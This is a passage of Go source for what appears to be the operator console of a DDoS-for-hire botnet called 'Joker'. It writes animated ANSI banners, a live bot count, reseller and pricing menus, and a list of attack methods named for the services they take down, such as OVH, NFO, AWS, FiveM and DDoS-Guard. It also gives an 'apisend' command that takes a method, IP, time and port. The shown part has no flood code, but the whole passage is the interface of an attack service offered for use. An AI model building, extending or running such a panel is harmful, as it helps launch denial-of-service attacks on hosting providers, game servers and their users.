            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗╦═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ ╠╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝╩╚═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╚════════════════════════════════════════╝\r\n"))
    continue
        }   //info
        if err != nil || cmd == "RULES" || cmd == "rules" {
            this.conn.Write([]byte("\033[37m                       ╔════════════════\033[38m════════════════╗                 \r\n"))
            this.conn.Write([]byte("\033[37m                       ║  NO HITTING GOV\033[38mERNMENT SITES   ║                 \r\n"))
            this.conn.Write([]byte("\033[37m                       ║  NO HITTING BIG\033[38m SITES          ║                 \r\n"))
            this.conn.Write([]byte("\033[37m                       ║  NO SPAMMING AT\033[38mTACKS           ║                 \r\n"))
            this.conn.Write([]byte("\033[37m                       ║  NO TRYING TO\033[38m BYPASS ANY RULES ║                 \r\n"))
            this.conn.Write([]byte("\033[37m                       ╚═══════════════\033[38m═════════════════╝                 \r\n"))
            continue
        }
        if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            botCount = clientList.Count()
            this.conn.Write([]byte("\x1b[1;35m╔════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32m---- Methods List! --- \x1b[1;35m╚═════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen3   > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen2   > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer4 > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer7 > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mprivate> \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mraw    > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mmore   > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════╝\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32m---- Methods List! --- \x1b[1;35m╚═════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen3   > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen2   > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer4 > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer7 > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mprivate> \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mraw    > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mmore   > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════╝\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32m---- Methods List! --- \x1b[1;35m╚═════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen3   > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen2   > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer4 > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer7 > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mprivate> \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mraw    > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mmore   > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════╝\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32m---- Methods List! --- \x1b[1;35m╚═════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen3   > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen2   > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer4 > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer7 > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mprivate> \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mraw    > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mmore   > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════╝\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32m---- Methods List! --- \x1b[1;35m╚═════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen3   > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen2   > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer4 > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer7 > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mprivate> \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mraw    > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mmore   > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════╝\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32m---- Methods List! --- \x1b[1;35m╚═════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen3   > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen2   > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer4 > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer7 > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mprivate> \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mraw    > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mmore   > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════╝\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32m---- Methods List! --- \x1b[1;35m╚═════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen3   > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen2   > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer4 > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer7 > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mprivate> \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mraw    > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mmore   > \033[31mOFFLINE!\x1b[1;35m                ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════╝\r\n")) 
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32m---- Methods List! --- \x1b[1;35m╚═════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen3   > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen2   > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer4 > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer7 > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mprivate> \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mraw    > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mmore   > \033[32mONLINE!\x1b[1;35m                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════╝\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32m---- Methods List! --- \x1b[1;35m╚═════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen3   > Shows Gen3 Methods!\x1b[1;35m     ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mgen2   > Shows Gen2 Methods!\x1b[1;35m     ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer4 > Shows Layer 4 Methods!\x1b[1;35m  ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mlayer7 > Shows Layer 7 Methods!\x1b[1;35m  ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mprivate> Shows Private Methods!\x1b[1;35m  ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mraw    > Shows Raw Methods!\x1b[1;35m      ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mmore   > Shows More Methods!\x1b[1;35m     ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╠══════════════════════════════════╝                   \r\n"))    
            this.conn.Write([]byte("\x1b[1;35m╠════════════════════════╗                             \r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32m---- Help List <3 ---- \x1b[1;35m╚═════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mcls   > Clear The Screen!\x1b[1;35m        ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mcontact   > Shows contacts!\x1b[1;35m      ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mbanner > Shows banners of joker!\x1b[1;35m ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32minfo > Shows info of net Methods!\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mreseller > Shows reseller comms!\x1b[1;35m ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mrules    > Shows Rules Of Joker!\x1b[1;35m ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mplans   > Shows Plans Cost!\x1b[1;35m      ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════╝\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\x1b[1;35mBOT COUNT\x1b[1;32m [\x1b[1;35m%d\x1b[1;32m]        \033[0m \r\n", botCount)))
            this.conn.Write([]byte("\r\n"))
            continue
        }
                if err != nil || cmd == "MORE" || cmd == "more" || cmd == "..." {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            botCount = clientList.Count()
            this.conn.Write([]byte("\x1b[1;35m                                 ╦\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔═════════════════════════╗═════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mnfo-down .  ovh-down  \x1b[1;35m║   \x1b[1;32movh-crush .  dedipath \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mgame-nfo .  ovh-game  \x1b[1;35m║   \x1b[1;32mfivem-nfo .  serverv2 \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚╗════════════════════════╝════════════════════════╔╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32msy-killall   .  sy-killallv2  .  sy-killallv3  \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mcaptcha-down .  2k-21         .  ddos-guard    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mark-destroy  .  tcp-down      .  udp-downv2    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mudp-down     .  sy-kilallv4   .  server        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mvpn-down     .  od-down       .  redsyn        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mnfo-mob      .  aws-destroy   .  sos           \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔╝  \x1b[1;32m wra         .     odin     .   dns       .    sos   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║══════════════════════════════════════════════════╚╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║═══════════════════════════════════════════════════║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║        \x1b[1;32mapisend [METHOD [IP] [TIME] [PORT]         \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚═══════════════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔═════════════════════════╗═════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mnfo-down .  ovh-down  \x1b[1;35m║   \x1b[1;32movh-crush .  dedipath \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mgame-nfo .  ovh-game  \x1b[1;35m║   \x1b[1;32mfivem-nfo .  serverv2 \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚╗════════════════════════╝════════════════════════╔╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32msy-killall   .  sy-killallv2  .  sy-killallv3  \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mcaptcha-down .  2k-21         .  ddos-guard    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mark-destroy  .  tcp-down      .  udp-downv2    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mudp-down     .  sy-kilallv4   .  server        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mvpn-down     .  od-down       .  redsyn        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mnfo-mob      .  aws-destroy   .  sos           \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔╝  \x1b[1;32m wra         .     odin     .   dns       .    sos   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║══════════════════════════════════════════════════╚╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║═══════════════════════════════════════════════════║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║        \x1b[1;32mapisend [METHOD [IP] [TIME] [PORT]         \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚═══════════════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔═════════════════════════╗═════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mnfo-down .  ovh-down  \x1b[1;35m║   \x1b[1;32movh-crush .  dedipath \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mgame-nfo .  ovh-game  \x1b[1;35m║   \x1b[1;32mfivem-nfo .  serverv2 \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚╗════════════════════════╝════════════════════════╔╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32msy-killall   .  sy-killallv2  .  sy-killallv3  \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mcaptcha-down .  2k-21         .  ddos-guard    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mark-destroy  .  tcp-down      .  udp-downv2    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mudp-down     .  sy-kilallv4   .  server        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mvpn-down     .  od-down       .  redsyn        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mnfo-mob      .  aws-destroy   .  sos           \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔╝  \x1b[1;32m wra         .     odin     .   dns       .    sos   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║══════════════════════════════════════════════════╚╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║═══════════════════════════════════════════════════║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║        \x1b[1;32mapisend [METHOD [IP] [TIME] [PORT]         \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚═══════════════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔═════════════════════════╗═════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mnfo-down .  ovh-down  \x1b[1;35m║   \x1b[1;32movh-crush .  dedipath \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mgame-nfo .  ovh-game  \x1b[1;35m║   \x1b[1;32mfivem-nfo .  serverv2 \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚╗════════════════════════╝════════════════════════╔╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32msy-killall   .  sy-killallv2  .  sy-killallv3  \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mcaptcha-down .  2k-21         .  ddos-guard    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mark-destroy  .  tcp-down      .  udp-downv2    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mudp-down     .  sy-kilallv4   .  server        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mvpn-down     .  od-down       .  redsyn        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mnfo-mob      .  aws-destroy   .  sos           \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔╝  \x1b[1;32m wra         .     odin     .   dns       .    sos   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║══════════════════════════════════════════════════╚╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║═══════════════════════════════════════════════════║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║        \x1b[1;32mapisend [METHOD [IP] [TIME] [PORT]         \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚═══════════════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
